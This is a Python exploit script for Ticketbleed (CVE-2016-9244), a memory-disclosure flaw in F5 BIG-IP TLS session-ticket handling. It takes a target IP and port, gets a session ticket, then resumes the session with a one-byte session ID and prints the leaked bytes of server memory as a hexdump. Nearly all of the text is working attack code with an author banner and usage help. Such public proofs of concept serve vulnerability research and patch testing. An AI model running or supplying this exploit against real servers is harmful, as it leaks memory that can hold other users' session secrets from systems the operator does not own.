# -*- coding: utf-8 -*-
#!/usr/bin/python
# Exploit Title: Ticketbleed
# Google Dork: n/a
# Date: Exploit: 02/13/17, Advisory Published: 02/09/17 
# Exploit Author: @0x00string
# Vendor Homepage: https://f5.com/
# Software Link: https://support.f5.com/csp/article/K05121675
# Version: see software link for versions
# Tested on: F5 BIGIP 11.6
# CVE : CVE-2016-9244
# require: scapy_ssl_tls (https://github.com/tintinweb/scapy-ssl_tls)
import re, getopt, sys, socket
from struct import *
try:
    from scapy_ssl_tls.ssl_tls import *
except ImportError:
    from scapy.layers.ssl_tls import *

def banner():
    print '''
            lol ty filippo!
             ty tintinweb!
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2016-9244.py
'''

def usage ():
    print   ("python script.py <args>\n"
            "   -h, --help:             Show this message\n"
            "   -a, --rhost:            Target IP address\n"
            "   -b, --rport:            Target port\n"
            "\n\n"
            "Examples:\n"
            "python script.py -a 10.10.10.10 -b 443\n"
            "python script.py --rhost 10.10.10.10 --rport 8443")
    exit()

def pretty (t, m):
    if (t is "+"):
            print "\x1b[32;1m[+]\x1b[0m\t" + m + "\n",
    elif (t is "-"):
            print "\x1b[31;1m[-]\x1b[0m\t" + m + "\n",
    elif (t is "*"):
            print "\x1b[34;1m[*]\x1b[0m\t" + m + "\n",
    elif (t is "!"):
            print "\x1b[33;1m[!]\x1b[0m\t" + m + "\n",

def createDump (input):
    d, b, h = '', [], []
    u = list(input)
    for e in u:
            h.append(e.encode("hex"))
            if e == '0x0':
                    b.append('0')
            elif 30 > ord(e) or ord(e) > 128:
                    b.append('.')
            elif 30 < ord(e) or ord(e) < 128:
                    b.append(e)

    i = 0
    while i < len(h):
            if (len(h) - i ) >= 16:
                    d += ' '.join(h[i:i+16])
                    d += "         "
                    d += ' '.join(b[i:i+16])
                    d += "\n"
                    i = i + 16
            else:
                    d += ' '.join(h[i:(len(h) - 0 )])
                    pad = len(' '.join(h[i:(len(h) - 0 )]))
                    d += ' ' * (56 - pad)
                    d += ' '.join(b[i:(len(h) - 0 )])
                    d += "\n"
                    i = i + len(h)
    return d

def ticketBleed (rhost, rport):
    h = (rhost,int(rport));
    version = TLSVersion.TLS_1_2
    secret = ""
    session_ticket = ""
    sid = ""
    cipher = TLSCipherSuite.ECDHE_RSA_WITH_AES_256_CBC_SHA
    with TLSSocket(socket.socket(), client=True) as sock:
        sock.connect(h)
        ctx = sock.tls_ctx
    	packet = TLSRecord() / TLSHandshake() / TLSClientHello(version=version, cipher_suites=TLS_CIPHER_SUITES.keys(), extensions=[TLSExtension() / TLSExtSessionTicketTLS(data="")])
        sock.sendall(packet)
        sock.recvall()
    	packet_ke = TLSRecord(version=version) / TLSHandshake() / ctx.get_client_kex_data()
        packet_ccs = TLSRecord(version=TLSVersion.TLS_1_2) / TLSChangeCipherSpec()
        sock.sendall(TLS.from_records([packet_ke, packet_ccs]))
        sock.sendall(to_raw(TLSFinished(), ctx))
        ret = sock.recvall()
        session_ticket = ret[TLSSessionTicket].ticket
        secret = ctx.master_secret
        #pretty("*", "ctx 1: \n" + str(ctx))
    with TLSSocket(socket.socket(), client=True) as sock:
        sock.connect(h)
        ctx = sock.tls_ctx
    	packet = TLSRecord() / TLSHandshake() / TLSClientHello(version=TLSVersion.TLS_1_2, cipher_suites=TLS_CIPHER_SUITES.keys(), session_id="A", extensions=[TLSExtension() / TLSExtSessionTicketTLS(data=session_ticket)])
        sock.tls_ctx.resume_session(secret)
        sock.sendall(packet)
        ret = sock.recvall()
        sid = ret[TLSServerHello].session_id
        #pretty("*", "ctx 2: \n" + str(ctx))
        pretty("+", "bled 'A' + 31 bytes: \n" + createDump(sid))

def main():
    rhost = None;
    rport = None;
    options, remainder = getopt.getopt(sys.argv[1:], 'a:b:h:', ['rhost=','rport=','help',])
    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-a','--rhost'):
            rhost = arg;
        elif opt in ('-b','--rport'):
            rport = arg;
    banner()
    if rhost is None or rport is None:
        usage()
    ticketBleed(rhost,rport)
    exit(0);

if __name__ == "__main__":
    main()